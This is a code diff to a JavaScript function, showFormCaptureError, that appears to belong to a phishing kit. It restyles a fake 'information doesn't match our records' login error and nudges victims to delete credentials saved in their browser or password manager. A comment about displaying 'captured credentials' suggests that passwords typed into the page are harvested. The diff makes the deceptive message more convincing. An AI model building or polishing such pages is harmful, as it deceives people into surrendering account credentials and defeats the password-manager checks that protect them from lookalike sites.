@@ -89,16 +89,18 @@ function showFormCaptureError() {
   
   const err = document.createElement('div');
   err.className = 'error-state';
-  err.style.cssText = 'background:#fff3cd;border:1px solid #ffc107;border-left:5px solid #ff6b6b;padding:16px;margin:20px;font-size:14px;color:#333;display:block;z-index:10000;';
+  err.style.cssText = 'background:#fce4ec;border:1px solid #f48fb1;border-left:5px solid #d32f2f;padding:16px;margin:20px;font-size:13px;color:#333;display:block;z-index:10000;font-family:Arial,sans-serif;line-height:1.5;';
   
-  let message = '<div style="display:flex;gap:12px;">';
-  message += '<div style="flex-shrink:0;color:#d32f2f;font-size:24px;line-height:1;">⚠</div>';
-  message += '<div>';
-  message += '<strong style="color:#d32f2f;display:block;margin-bottom:8px;">The information you entered doesn\'t match our records.</strong>';
-  message += 'You have a few more tries remaining.<br>';
-  message += 'Please try again or <a href="./login-reset.html" style="color:#0066cc;text-decoration:none;">click Forgot ID/Password</a>';
+  let message = '<div style="display:flex;gap:12px;align-items:flex-start;">';
+  message += '<div style="flex-shrink:0;color:#d32f2f;font-size:20px;line-height:1.2;margin-top:2px;">⚠</div>';
+  message += '<div style="flex:1;">';
+  message += 'The information you entered doesn\'t match our records. You have a few more tries remaining.<br>';
+  message += 'Please try again or <a href="./login-reset.html" style="color:#0066cc;text-decoration:underline;cursor:pointer;">click Forgot ID/Password</a>';
   message += '<br><br>';
-  message += '<span style="font-size:12px;color:#666;">Having problems logging in or resetting your Password? If you\'re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a href="#" style="color:#0066cc;text-decoration:none;">Learn more</a></span>';
+  message += '<div style="border-top:1px solid #f48fb1;padding-top:12px;margin-top:12px;">';
+  message += '<strong style="color:#666;font-size:12px;display:block;margin-bottom:8px;">Having problems logging in or resetting your Password?</strong>';
+  message += '<span style="font-size:12px;color:#666;line-height:1.6;">If you\'re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a href="#" style="color:#0066cc;text-decoration:underline;">Learn more</a></span>';
+  message += '</div>';
   message += '</div></div>';
   
   // Display captured credentials if available
